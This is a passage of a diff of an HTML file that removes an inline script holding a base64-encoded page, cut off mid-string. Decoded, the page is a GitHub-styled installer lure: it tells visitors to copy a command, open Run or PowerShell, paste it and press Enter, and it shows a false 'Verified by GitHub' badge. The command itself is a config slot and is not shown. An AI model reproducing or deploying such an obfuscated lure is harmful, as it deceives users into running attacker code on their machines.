@@ -1,271 +1,486 @@
 <!doctype html>
-<html>
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<title>Online</title>
-</head>
-<body>
-<script>
-(function(){
-var _pi6qh5r2 = ("PCFkb2N0eXBlIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CjxtZXRhIGNoYXJzZXQ9InV0Zi04"
-+"Ij4KPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlh"
-+"bC1zY2FsZT0xIj4KPHRpdGxlPkxvYWRpbmfigKY8L3RpdGxlPgo8c3R5bGU+Cjpyb290IHsKICBjb2xv"
-+"ci1zY2hlbWU6IGxpZ2h0OwogIC0tZmc6ICMxZjIzMjg7CiAgLS1mZy1tdXRlZDogIzU5NjM2ZTsKICAt"
-+"LWJnOiAjZmZmZmZmOwogIC0tYmctc3VidGxlOiAjZjZmOGZhOwogIC0tYm9yZGVyOiAjZDFkOWUwOwog"
-+"IC0tYWNjZW50OiAjMDk2OWRhOwogIC0tc3VjY2Vzcy1mZzogIzFhN2YzNzsKICAtLWJ0bi1iZzogI2Y2"
-+"ZjhmYTsKICAtLWJ0bi1ob3ZlcjogI2VmZjJmNTsKICAtLXRhYi1hY3RpdmU6ICNmZDhjNzM7CiAgLS1t"
-+"b25vOiB1aS1tb25vc3BhY2UsIFNGTW9uby1SZWd1bGFyLCAiU0YgTW9ubyIsIE1lbmxvLCBDb25zb2xh"
-+"cywgIkxpYmVyYXRpb24gTW9ubyIsIG1vbm9zcGFjZTsKfQpAbWVkaWEgKHByZWZlcnMtY29sb3Itc2No"
-+"ZW1lOiBkYXJrKSB7CiAgOnJvb3QgewogICAgY29sb3Itc2NoZW1lOiBkYXJrOwogICAgLS1mZzogI2Yw"
-+"ZjZmYzsKICAgIC0tZmctbXV0ZWQ6ICM5MTk4YTE7CiAgICAtLWJnOiAjMGQxMTE3OwogICAgLS1iZy1z"
-+"dWJ0bGU6ICMxNTFiMjM7CiAgICAtLWJvcmRlcjogIzNkNDQ0ZDsKICAgIC0tYWNjZW50OiAjNDQ5M2Y4"
-+"OwogICAgLS1zdWNjZXNzLWZnOiAjM2ZiOTUwOwogICAgLS1idG4tYmc6ICMyMTI4MzA7CiAgICAtLWJ0"
-+"bi1ob3ZlcjogIzI2MmMzNjsKICAgIC0tdGFiLWFjdGl2ZTogI2Y3ODE2NjsKICB9Cn0KKiB7IGJveC1z"
-+"aXppbmc6IGJvcmRlci1ib3g7IH0KYm9keSB7CiAgbWFyZ2luOiAwOwogIGJhY2tncm91bmQ6IHZhcigt"
-+"LWJnKTsKICBjb2xvcjogdmFyKC0tZmcpOwogIGZvbnQ6IDE0cHgvMS41IC1hcHBsZS1zeXN0ZW0sIEJs"
-+"aW5rTWFjU3lzdGVtRm9udCwgIlNlZ29lIFVJIiwgIk5vdG8gU2FucyIsIEhlbHZldGljYSwgQXJpYWws"
-+"IHNhbnMtc2VyaWY7Cn0KYSB7IGNvbG9yOiB2YXIoLS1hY2NlbnQpOyB0ZXh0LWRlY29yYXRpb246IG5v"
-+"bmU7IH0KYTpob3ZlciB7IHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOyB9CnN2ZyB7IGZpbGw6IGN1"
-+"cnJlbnRDb2xvcjsgZmxleC1zaHJpbms6IDA7IH0KYTpmb2N1cy12aXNpYmxlLCBidXR0b246Zm9jdXMt"
-+"dmlzaWJsZSwgaW5wdXQ6Zm9jdXMtdmlzaWJsZSwgbGFiZWw6Zm9jdXMtdmlzaWJsZSB7IG91dGxpbmU6"
-+"IDJweCBzb2xpZCB2YXIoLS1hY2NlbnQpOyBvdXRsaW5lLW9mZnNldDogMnB4OyB9CgoudGFiLWlucHV0"
-+"IHsgcG9zaXRpb246IGFic29sdXRlOyB3aWR0aDogMDsgaGVpZ2h0OiAwOyBvcGFjaXR5OiAwOyBwb2lu"
-+"dGVyLWV2ZW50czogbm9uZTsgfQoKLndyYXAgeyBtYXgtd2lkdGg6IDcyMHB4OyBtYXJnaW46IDAgYXV0"
-+"bzsgcGFkZGluZy1pbmxpbmU6IDE2cHg7IH0KCi50b3AgeyBiYWNrZ3JvdW5kOiB2YXIoLS1iZy1zdWJ0"
-+"bGUpOyBib3JkZXItYm90dG9tOiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsgfQoudG9wIC53cmFwIHsg"
-+"ZGlzcGxheTogZmxleDsgYWxpZ24taXRlbXM6IGNlbnRlcjsganVzdGlmeS1jb250ZW50OiBzcGFjZS1i"
-+"ZXR3ZWVuOyBnYXA6IDEycHg7IG1pbi1oZWlnaHQ6IDY0cHg7IH0KLmNydW1iIHsgZGlzcGxheTogZmxl"
-+"eDsgYWxpZ24taXRlbXM6IGNlbnRlcjsgZ2FwOiA4cHg7IGZvbnQtc2l6ZTogMTZweDsgY29sb3I6IHZh"
-+"cigtLWZnKTsgbWluLXdpZHRoOiAwOyB9Ci5jcnVtYjpob3ZlciB7IHRleHQtZGVjb3JhdGlvbjogbm9u"
-+"ZTsgfQouY3J1bWI6aG92ZXIgc3Ryb25nIHsgdGV4dC1kZWNvcmF0aW9uOiB1bmRlcmxpbmU7IH0KLmNy"
-+"dW1iIC5zZXAgeyBjb2xvcjogdmFyKC0tZmctbXV0ZWQpOyB9Ci5jcnVtYiBzdHJvbmcgeyBmb250LXdl"
-+"aWdodDogNjAwOyB9Ci5hdmF0YXIgeyB3aWR0aDogMjRweDsgaGVpZ2h0OiAyNHB4OyBib3JkZXItcmFk"
-+"aXVzOiA1MCU7IGJveC1zaGFkb3c6IDAgMCAwIDFweCB2YXIoLS1ib3JkZXIpOyBiYWNrZ3JvdW5kOiB2"
-+"YXIoLS1iZy1zdWJ0bGUpOyB9CgouYnRuIHsKICBkaXNwbGF5OiBpbmxpbmUtZmxleDsgYWxpZ24taXRl"
-+"bXM6IGNlbnRlcjsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7IGdhcDogOHB4OwogIGhlaWdodDogMzJw"
-+"eDsgcGFkZGluZzogMCAxMnB4OwogIGZvbnQ6IDUwMCAxNHB4LzEgaW5oZXJpdDsgZm9udC1mYW1pbHk6"
-+"IGluaGVyaXQ7CiAgY29sb3I6IHZhcigtLWZnKTsgYmFja2dyb3VuZDogdmFyKC0tYnRuLWJnKTsKICBi"
-+"b3JkZXI6IDFweCBzb2xpZCB2YXIoLS1ib3JkZXIpOyBib3JkZXItcmFkaXVzOiA2cHg7CiAgY3Vyc29y"
-+"OiBwb2ludGVyOyB3aGl0ZS1zcGFjZTogbm93cmFwOwp9Ci5idG46aG92ZXIgeyBiYWNrZ3JvdW5kOiB2"
-+"YXIoLS1idG4taG92ZXIpOyB0ZXh0LWRlY29yYXRpb246IG5vbmU7IH0KLmJ0biBzdmcgeyBjb2xvcjog"
-+"dmFyKC0tZmctbXV0ZWQpOyB9CgptYWluIHsgcGFkZGluZy1ibG9jazogNDBweCA0OHB4OyB9CgouaGVh"
-+"ZCB7IG1hcmdpbi1ib3R0b206IDI0cHg7IH0KLmhlYWQgaDEgeyBtYXJnaW46IDA7IGZvbnQtc2l6ZTog"
-+"MjRweDsgZm9udC13ZWlnaHQ6IDYwMDsgbGluZS1oZWlnaHQ6IDEuMjU7IH0KLmhlYWQgcCB7IG1hcmdp"
-+"bjogOHB4IDAgMDsgY29sb3I6IHZhcigtLWZnLW11dGVkKTsgZm9udC1zaXplOiAxNnB4OyB9CgouQm94"
-+"IHsgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsgYm9yZGVyLXJhZGl1czogNnB4OyBiYWNr"
-+"Z3JvdW5kOiB2YXIoLS1iZyk7IH0KLkJveC1ib2R5IHsgcGFkZGluZzogMjRweDsgfQouQm94LWZvb3Rl"
-+"ciB7CiAgZGlzcGxheTogZmxleDsgZmxleC13cmFwOiB3cmFwOyBhbGlnbi1pdGVtczogY2VudGVyOyBq"
-+"dXN0aWZ5LWNvbnRlbnQ6IHNwYWNlLWJldHdlZW47IGdhcDogOHB4IDE2cHg7CiAgcGFkZGluZzogMTJw"
-+"eCAyNHB4OyBib3JkZXItdG9wOiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsgYmFja2dyb3VuZDogdmFy"
-+"KC0tYmctc3VidGxlKTsKICBib3JkZXItcmFkaXVzOiAwIDAgNnB4IDZweDsgY29sb3I6IHZhcigtLWZn"
-+"LW11dGVkKTsKfQoudmVyaWZpZWQgeyBkaXNwbGF5OiBpbmxpbmUtZmxleDsgYWxpZ24taXRlbXM6IGNl"
-+"bnRlcjsgZ2FwOiA2cHg7IGNvbG9yOiB2YXIoLS1zdWNjZXNzLWZnKTsgZm9udC13ZWlnaHQ6IDUwMDsg"
-+"fQoKLnRhYnMgeyBkaXNwbGF5OiBmbGV4OyBnYXA6IDhweDsgYm94LXNoYWRvdzogaW5zZXQgMCAtMXB4"
-+"IDAgdmFyKC0tYm9yZGVyKTsgbWFyZ2luOiAtMjRweCAtMjRweCAyMHB4OyBwYWRkaW5nOiAwIDE2cHg7"
-+"IH0KLnRhYiB7CiAgcG9zaXRpb246IHJlbGF0aXZlOyBwYWRkaW5nOiAxMnB4IDhweDsKICBmb250OiA1"
-+"MDAgMTRweC8xIGluaGVyaXQ7CiAgY29sb3I6IHZhcigtLWZnLW11dGVkKTsgY3Vyc29yOiBwb2ludGVy"
-+"OyB1c2VyLXNlbGVjdDogbm9uZTsKfQoudGFiOmhvdmVyIHsgY29sb3I6IHZhcigtLWZnKTsgfQojdC1j"
-+"bWQ6Y2hlY2tlZCB+ICogbGFiZWxbZm9yPSJ0LWNtZCJdLAojdC1wczpjaGVja2VkIH4gKiBsYWJlbFtm"
-+"b3I9InQtcHMiXSB7IGNvbG9yOiB2YXIoLS1mZyk7IGZvbnQtd2VpZ2h0OiA2MDA7IH0KI3QtY21kOmNo"
-+"ZWNrZWQgfiAqIGxhYmVsW2Zvcj0idC1jbWQiXTo6YWZ0ZXIsCiN0LXBzOmNoZWNrZWQgfiAqIGxhYmVs"
-+"W2Zvcj0idC1wcyJdOjphZnRlciB7CiAgY29udGVudDogIiI7IHBvc2l0aW9uOiBhYnNvbHV0ZTsgbGVm"
-+"dDogMDsgcmlnaHQ6IDA7IGJvdHRvbTogMDsKICBoZWlnaHQ6IDJweDsgYm9yZGVyLXJhZGl1czogNnB4"
-+"OyBiYWNrZ3JvdW5kOiB2YXIoLS10YWItYWN0aXZlKTsKfQoKI3QtY21kOmNoZWNrZWQgfiAqIC52YXJp"
-+"YW50LXBzLAojdC1wczpjaGVja2VkIH4gKiAudmFyaWFudC1jbWQgeyBkaXNwbGF5OiBub25lICFpbXBv"
-+"cnRhbnQ7IH0KCi5jbWQgeyBkaXNwbGF5OiBmbGV4OyB9Ci5jbWQgaW5wdXQgewogIGZsZXg6IDE7IG1p"
-+"bi13aWR0aDogMDsgaGVpZ2h0OiA0MHB4OyBwYWRkaW5nOiAwIDEycHg7CiAgZm9udDogMTNweCB2YXIo"
-+"LS1tb25vKTsgY29sb3I6IHZhcigtLWZnKTsKICBiYWNrZ3JvdW5kOiB2YXIoLS1iZy1zdWJ0bGUpOyBi"
-+"b3JkZXI6IDFweCBzb2xpZCB2YXIoLS1ib3JkZXIpOwogIGJvcmRlci1yYWRpdXM6IDZweCAwIDAgNnB4"
-+"OyBib3JkZXItcmlnaHQ6IDA7Cn0KLmNtZCAuYnRuIHsgaGVpZ2h0OiA0MHB4OyB3aWR0aDogNDRweDsg"
-+"cGFkZGluZzogMDsgYm9yZGVyLXJhZGl1czogMCA2cHggNnB4IDA7IH0KCi5zdGVwcyB7IG1hcmdpbjog"
-+"MDsgcGFkZGluZzogMDsgbGlzdC1zdHlsZTogbm9uZTsgfQouc3RlcCB7IHBvc2l0aW9uOiByZWxhdGl2"
-+"ZTsgZGlzcGxheTogZ3JpZDsgZ3JpZC10ZW1wbGF0ZS1jb2x1bW5zOiAzMnB4IDFmcjsgZ2FwOiAxNnB4"
-+"OyBwYWRkaW5nLWJvdHRvbTogMjRweDsgfQouc3RlcDpsYXN0LWNoaWxkIHsgcGFkZGluZy1ib3R0b206"
-+"IDA7IH0KLnN0ZXA6OmJlZm9yZSB7IGNvbnRlbnQ6ICIiOyBwb3NpdGlvbjogYWJzb2x1dGU7IGxlZnQ6"
-+"IDE1cHg7IHRvcDogMzJweDsgYm90dG9tOiAwOyB3aWR0aDogMnB4OyBiYWNrZ3JvdW5kOiB2YXIoLS1i"
-+"b3JkZXIpOyB9Ci5zdGVwOmxhc3QtY2hpbGQ6OmJlZm9yZSB7IGRpc3BsYXk6IG5vbmU7IH0KLnN0ZXAt"
-+"bnVtIHsKICBkaXNwbGF5OiBncmlkOyBwbGFjZS1pdGVtczogY2VudGVyOyB3aWR0aDogMzJweDsgaGVp"
-+"Z2h0OiAzMnB4OwogIGZvbnQtd2VpZ2h0OiA2MDA7IGNvbG9yOiB2YXIoLS1mZyk7CiAgYmFja2dyb3Vu"
-+"ZDogdmFyKC0tYmctc3VidGxlKTsgYm9yZGVyOiAxcHggc29saWQgdmFyKC0tYm9yZGVyKTsgYm9yZGVy"
-+"LXJhZGl1czogNTAlOwp9Ci5zdGVwLWJvZHkgeyBtaW4td2lkdGg6IDA7IHBhZGRpbmctdG9wOiA1cHg7"
-+"IH0KLnN0ZXAtdGl0bGUgeyBmb250LXdlaWdodDogNjAwOyB9Ci5zdGVwLW5vdGUgeyBtYXJnaW4tdG9w"
-+"OiAycHg7IGNvbG9yOiB2YXIoLS1mZy1tdXRlZCk7IH0KLnN0ZXAgLmNtZCB7IG1hcmdpbi10b3A6IDhw"
-+"eDsgfQoKa2JkIHsKICBkaXNwbGF5OiBpbmxpbmUtYmxvY2s7IHBhZGRpbmc6IDNweCA2cHg7IHZlcnRp"
-+"Y2FsLWFsaWduOiAxcHg7CiAgZm9udDogMTJweC8xMnB4IHZhcigtLW1vbm8pOyBjb2xvcjogdmFyKC0t"
-+"ZmcpOwogIGJhY2tncm91bmQ6IHZhcigtLWJnLXN1YnRsZSk7IGJvcmRlcjogMXB4IHNvbGlkIHZhcigt"
-+"LWJvcmRlcik7IGJvcmRlci1yYWRpdXM6IDZweDsKICBib3gtc2hhZG93OiBpbnNldCAwIC0xcHggMCB2"
-+"YXIoLS1ib3JkZXIpOwp9CgpAbWVkaWEgKG1heC13aWR0aDogNTQ0cHgpIHsKICBtYWluIHsgcGFkZGlu"
-+"Zy1ibG9jazogMjRweCA0MHB4OyB9CiAgLkJveC1ib2R5IHsgcGFkZGluZzogMTZweDsgfQogIC5Cb3gt"
-+"Zm9vdGVyIHsgcGFkZGluZzogMTJweCAxNnB4OyB9CiAgLnRhYnMgeyBtYXJnaW46IC0xNnB4IC0xNnB4"
-+"IDE2cHg7IHBhZGRpbmc6IDAgOHB4OyB9CiAgLnRvcCAuYnRuIHNwYW4geyBkaXNwbGF5OiBub25lOyB9"
-+"Cn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KCjxpbnB1dCB0eXBlPSJyYWRpbyIgbmFtZT0idGFiIiBp"
-+"ZD0idC1wcyIgY2xhc3M9InRhYi1pbnB1dCIgY2hlY2tlZD4KPGlucHV0IHR5cGU9InJhZGlvIiBuYW1l"
-+"PSJ0YWIiIGlkPSJ0LWNtZCIgY2xhc3M9InRhYi1pbnB1dCI+Cgo8aGVhZGVyIGNsYXNzPSJ0b3AiPgog"
-+"IDxkaXYgY2xhc3M9IndyYXAiPgogICAgPGEgY2xhc3M9ImNydW1iIiBkYXRhLXNsb3QtaHJlZj0iZ2l0"
-+"aHViVXJsIiBocmVmPSIjIj4KICAgICAgPGltZyBjbGFzcz0iYXZhdGFyIiBkYXRhLXNsb3Qtc3JjPSJh"
-+"dmF0YXJVcmwiIHNyYz0iIiBhbHQ9IiI+CiAgICAgIDxzcGFuIGRhdGEtc2xvdD0ib3duZXIiPjwvc3Bh"
-+"bj48c3BhbiBjbGFzcz0ic2VwIj4vPC9zcGFuPjxzdHJvbmcgZGF0YS1zbG90PSJyZXBvIj48L3N0cm9u"
-+"Zz4KICAgIDwvYT4KICAgIDxhIGNsYXNzPSJidG4iIGRhdGEtc2xvdC1ocmVmPSJnaXRodWJVcmwiIGhy"
-+"ZWY9IiMiPgogICAgICA8c3ZnIHdpZHRoPSIxNiIgaGVpZ2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2"
-+"Ij48cGF0aCBkPSJNMiAyLjVBMi41IDIuNSAwIDAgMSA0LjUgMGg4Ljc1YS43NS43NSAwIDAgMSAuNzUu"
-+"NzV2MTIuNWEuNzUuNzUgMCAwIDEtLjc1Ljc1aC0yLjVhLjc1Ljc1IDAgMCAxIDAtMS41aDEuNzV2LTJo"
-+"LThhMSAxIDAgMCAwLS43MTQgMS43Ljc1Ljc1IDAgMSAxLTEuMDcyIDEuMDVBMi40OTUgMi40OTUgMCAw"
-+"IDEgMiAxMS41Wm0xMC41LTFoLThhMSAxIDAgMCAwLTEgMXY2LjcwOEEyLjQ4NiAyLjQ4NiAwIDAgMSA0"
-+"LjUgOWg4Wk01IDEyLjI1YS4yNS4yNSAwIDAgMSAuMjUtLjI1aDMuNWEuMjUuMjUgMCAwIDEgLjI1LjI1"
-+"djMuMjVhLjI1LjI1IDAgMCAxLS40LjJsLTEuNDUtMS4wODdhLjI0OS4yNDkgMCAwIDAtLjMgMEw1LjQg"
-+"MTUuN2EuNzUuMjUgMCAwIDEtLjQtLjJaIi8+PC9zdmc+CiAgICAgIDxzcGFuPlZpZXcgcmVwb3NpdG9y"
-+"eTwvc3Bhbj4KICAgIDwvYT4KICA8L2Rpdj4KPC9oZWFkZXI+Cgo8bWFpbiBjbGFzcz0id3JhcCI+CiAg"
-+"PGRpdiBjbGFzcz0iaGVhZCI+CiAgICA8aDEgZGF0YS1zbG90PSJuYW1lIj48L2gxPgogICAgPHAgZGF0"
-+"YS1zbG90PSJ0YWdsaW5lIj48L3A+CiAgPC9kaXY+CgogIDxkaXYgY2xhc3M9IkJveCI+CiAgICA8ZGl2"
-+"IGNsYXNzPSJCb3gtYm9keSI+CiAgICAgIDxkaXYgY2xhc3M9InRhYnMiPgogICAgICAgIDxsYWJlbCBm"
-+"b3I9InQtcHMiIGNsYXNzPSJ0YWIiPlBvd2VyU2hlbGw8L2xhYmVsPgogICAgICAgIDxsYWJlbCBmb3I9"
-+"InQtY21kIiBjbGFzcz0idGFiIj5Db21tYW5kIFByb21wdDwvbGFiZWw+CiAgICAgIDwvZGl2PgogICAg"
-+"ICA8b2wgY2xhc3M9InN0ZXBzIj4KICAgICAgICA8bGkgY2xhc3M9InN0ZXAiPgogICAgICAgICAgPHNw"
-+"YW4gY2xhc3M9InN0ZXAtbnVtIj4xPC9zcGFuPgogICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC1ib2R5"
-+"Ij4KICAgICAgICAgICAgPGRpdiBjbGFzcz0ic3RlcC10aXRsZSI+Q29weSB0aGlzIGNvbW1hbmQ8L2Rp"
-+"dj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0iY21kIHZhcmlhbnQtY21kIj4KICAgICAgICAgICAgICA8"
-+"aW5wdXQgcmVhZG9ubHkgZGF0YS1zbG90LXZhbHVlPSJjbWRDbWQiIHZhbHVlPSIiIGFyaWEtbGFiZWw9"
-+"Ikluc3RhbGwgY29tbWFuZCIgc3BlbGxjaGVjaz0iZmFsc2UiPgogICAgICAgICAgICAgIDxidXR0b24g"
-+"Y2xhc3M9ImJ0biBjb3B5LWJ0biIgdHlwZT0iYnV0dG9uIiBhcmlhLWxhYmVsPSJDb3B5IGNvbW1hbmQi"
-+"PgogICAgICAgICAgICAgICAgPHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAx"
-+"NiAxNiI+PHBhdGggZD0iTTAgNi43NUMwIDUuNzg0Ljc4NCA1IDEuNzUgNWgxLjVhLjc1Ljc1IDAgMCAx"
-+"IDAgMS41aC0xLjVhLjI1LjI1IDAgMCAwLS4yNS4yNXY3LjVjMCAuMTM4LjExMi4yNS4yNS4yNWg3LjVh"
-+"LjI1LjI1IDAgMCAwIC4yNS0uMjV2LTEuNWEuNzUuNzUgMCAwIDEgMS41IDB2MS41QTEuNzUgMS43NSAw"
-+"IDAgMSA5LjI1IDE2aC03LjVBMS43NSAxLjc1IDAgMCAxIDAgMTQuMjVaIi8+PHBhdGggZD0iTTUgMS43"
-+"NUM1IC43ODQgNS43ODQgMCA2Ljc1IDBoNy41QzE1LjIxNiAwIDE2IC43ODQgMTYgMS43NXY3LjVBMS43"
-+"NSAxLjc1IDAgMCAxIDE0LjI1IDExaC03LjVBMS43NSAxLjc1IDAgMCAxIDUgOS4yNVptMS43NS0uMjVh"
-+"LjI1LjI1IDAgMCAwLS4yNS4yNXY3LjVjMCAuMTM4LjExMi4yNS4yNS4yNWg3LjVhLjI1LjI1IDAgMCAw"
-+"IC4yNS0uMjV2LTcuNWEuMjUuMjUgMCAwIDAtLjI1LS4yNVoiLz48L3N2Zz4KICAgICAgICAgICAgICA8"
-+"L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImNtZCB2YXJp"
-+"YW50LXBzIj4KICAgICAgICAgICAgICA8aW5wdXQgcmVhZG9ubHkgZGF0YS1zbG90LXZhbHVlPSJjbWRQ"
-+"cyIgdmFsdWU9IiIgYXJpYS1sYWJlbD0iSW5zdGFsbCBjb21tYW5kIiBzcGVsbGNoZWNrPSJmYWxzZSI+"
-+"CiAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGNvcHktYnRuIiB0eXBlPSJidXR0b24iIGFy"
-+"aWEtbGFiZWw9IkNvcHkgY29tbWFuZCI+CiAgICAgICAgICAgICAgICA8c3ZnIHdpZHRoPSIxNiIgaGVp"
-+"Z2h0PSIxNiIgdmlld0JveD0iMCAwIDE2IDE2Ij48cGF0aCBkPSJNMCA2Ljc1QzAgNS43ODQuNzg0IDUg"
-+"MS43NSA1aDEuNWEuNzUuNzUgMCAwIDEgMCAxLjVoLTEuNWEuMjUuMjUgMCAwIDAtLjI1LjI1djcuNWMw"
-+"IC4xMzguMTEyLjI1LjI1LjI1aDcuNWEuMjUuMjUgMCAwIDAgLjI1LS4yNXYtMS41YS43NS43NSAwIDAg"
-+"MSAxLjUgMHYxLjVBMS43NSAxLjc1IDAgMCAxIDkuMjUgMTZoLTcuNUExLjc1IDEuNzUgMCAwIDEgMCAx"
-+"NC4yNVoiLz48cGF0aCBkPSJNNSAxLjc1QzUgLjc4NCA1Ljc4NCAwIDYuNzUgMGg3LjVDMTUuMjE2IDAg"
-+"MTYgLjc4NCAxNiAxLjc1djcuNUExLjc1IDEuNzUgMCAwIDEgMTQuMjUgMTFoLTcuNUExLjc1IDEuNzUg"
-+"MCAwIDEgNSA5LjI1Wm0xLjc1LS4yNWEuMjUuMjUgMCAwIDAtLjI1LjI1djcuNWMwIC4xMzguMTEyLjI1"
-+"LjI1LjI1aDcuNWEuMjUuMjUgMCAwIDAgLjI1LS4yNXYtNy41YS4yNS4yNSAwIDAgMC0uMjUtLjI1WiIv"
-+"Pjwvc3ZnPgogICAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAg"
-+"IDwvZGl2PgogICAgICAgIDwvbGk+CiAgICAgICAgPGxpIGNsYXNzPSJzdGVwIj4KICAgICAgICAgIDxz"
-+"cGFuIGNsYXNzPSJzdGVwLW51bSI+Mjwvc3Bhbj4KICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtYm9k"
-+"eSI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InZhcmlhbnQtY21kIj4KICAgICAgICAgICAgICA8ZGl2"
-+"IGNsYXNzPSJzdGVwLXRpdGxlIj5QcmVzcyA8a2JkPldpbjwva2JkPiArIDxrYmQ+Ujwva2JkPjwvZGl2"
-+"PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtbm90ZSI+VHlwZSA8Yj5jbWQ8L2I+IGFuZCBw"
-+"cmVzcyA8a2JkPkVudGVyPC9rYmQ+IHRvIG9wZW4gQ29tbWFuZCBQcm9tcHQuPC9kaXY+CiAgICAgICAg"
-+"ICAgIDwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ2YXJpYW50LXBzIj4KICAgICAgICAgICAg"
-+"ICA8ZGl2IGNsYXNzPSJzdGVwLXRpdGxlIj5QcmVzcyA8a2JkPldpbjwva2JkPiArIDxrYmQ+WDwva2Jk"
-+"PjwvZGl2PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtbm90ZSI+TWVudSBvcGVucyBhdCBi"
-+"b3R0b20tbGVmdCDigJQgcGljayA8Yj5XaW5kb3dzIFBvd2VyU2hlbGw8L2I+LjwvZGl2PgogICAgICAg"
-+"ICAgICA8L2Rpdj4KICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvbGk+CiAgICAgICAgPGxpIGNsYXNz"
-+"PSJzdGVwIj4KICAgICAgICAgIDxzcGFuIGNsYXNzPSJzdGVwLW51bSI+Mzwvc3Bhbj4KICAgICAgICAg"
-+"IDxkaXYgY2xhc3M9InN0ZXAtYm9keSI+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtdGl0bGUi"
-+"PlBhc3RlIHdpdGggPGtiZD5DdHJsPC9rYmQ+ICsgPGtiZD5WPC9rYmQ+IGFuZCBwcmVzcyA8a2JkPkVu"
-+"dGVyPC9rYmQ+PC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InN0ZXAtbm90ZSI+VGhlIGxhdGVz"
-+"dCB2ZXJzaW9uIGRvd25sb2FkcyBhbmQgaW5zdGFsbHMgYnkgaXRzZWxmLjwvZGl2PgogICAgICAgICAg"
-+"PC9kaXY+CiAgICAgICAgPC9saT4KICAgICAgPC9vbD4KICAgIDwvZGl2PgogICAgPGRpdiBjbGFzcz0i"
-+"Qm94LWZvb3RlciI+CiAgICAgIDxzcGFuPlZlcnNpb24gPGEgZGF0YS1zbG90LWhyZWY9InJlbGVhc2VV"
-+"cmwiIGhyZWY9IiMiPjxzcGFuIGRhdGEtc2xvdD0idmVyc2lvbiI+PC9zcGFuPjwvYT4sIHJlbGVhc2Vk"
-+"IDxzcGFuIGRhdGEtc2xvdD0icmVsZWFzZURhdGUiPjwvc3Bhbj4uPC9zcGFuPgogICAgICA8c3BhbiBj"
-+"bGFzcz0idmVyaWZpZWQiIHRpdGxlPSJUaGlzIHBhZ2UgaXMgcHJvdmlkZWQgYnkgR2l0SHViIGFuZCB0"
-+"aGUgY29tbWFuZCBmZXRjaGVzIGZpbGVzIGZyb20gZ2l0aHViLmNvbSI+CiAgICAgICAgPHN2ZyB3aWR0"
-+"aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiI+PHBhdGggZD0iTTcuNDY3LjEzM2Ex"
-+"Ljc1IDEuNzUgMCAwIDEgMS4wNjYgMGw1LjI1IDEuNjhBMS43NSAxLjc1IDAgMCAxIDE1IDMuNDhWN2Mw"
-+"IDEuNTY2LS4zMiAzLjE4Mi0xLjMwMyA0LjY4Mi0uOTgzIDEuNDk4LTIuNTg1IDIuODEzLTUuMDMyIDMu"
-+"ODU1YTEuNjk3IDEuNjk3IDAgMCAxLTEuMzMgMGMtMi40NDctMS4wNDItNC4wNDktMi4zNTctNS4wMzIt"
-+"My44NTVDMS4zMiAxMC4xODIgMSA4LjU2NiAxIDdWMy40OGExLjc1IDEuNzUgMCAwIDEgMS4yMTctMS42"
-+"NjdabS42MSAxLjQyOWEuMjUuMjUgMCAwIDAtLjE1MyAwbC01LjI1IDEuNjhhLjI1LjI1IDAgMCAwLS4x"
-+"NzQuMjM4VjdjMCAxLjM1OC4yNzUgMi42NjYgMS4wNTcgMy44Ni43ODQgMS4xOTQgMi4xMjEgMi4zNCA0"
-+"LjM2NiAzLjI5N2EuMTk2LjE5NiAwIDAgMCAuMTU0IDBjMi4yNDUtLjk1NyAzLjU4Mi0yLjEwMyA0LjM2"
-+"Ni0zLjI5N0MxMy4yMjUgOS42NjYgMTMuNSA4LjM1OCAxMy41IDdWMy40OGEuMjUxLjI1MSAwIDAgMC0u"
-+"MTc0LS4yMzdsLTUuMjUtMS42OFpNMTAuNzggNi4yOGwtMy4yNSAzLjI1YS43NS43NSAwIDAgMS0xLjA2"
-+"IDBsLTEuNS0xLjVhLjc0OS43NDkgMCAwIDEgLjMyNi0xLjI3NS43NDkuNzQ5IDAgMCAxIC43MzQuMjE1"
-+"bC45Ny45NyAyLjcyLTIuNzJhLjc1MS43NTEgMCAwIDEgMS4wNDIuMDE4Ljc1MS43NTEgMCAwIDEgLjAx"
-+"OCAxLjA0MloiLz48L3N2Zz4KICAgICAgICBWZXJpZmllZCBieSBHaXRIdWIKICAgICAgPC9zcGFuPgog"
-+"ICAgPC9kaXY+CiAgPC9kaXY+CjwvbWFpbj4KCjwhLS0gPT09PT09PT09PT09PT09PT09PT09PT09PT09"
-+"PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiAgICAgQ09ORklHIOKAlCBlZGl0IHBlciBy"
-+"ZXBvLiBvd25lciAvIHJlcG8gLyBnaXRodWJVcmwgLyBhdmF0YXJVcmwgLwogICAgIHJlbGVhc2VVcmwg"
-+"YXJlIEFVVE8tREVURUNURUQgd2hlbiBzZXJ2ZWQgYXQKICAgICBodHRwczovLzxvd25lcj4uZ2l0aHVi"
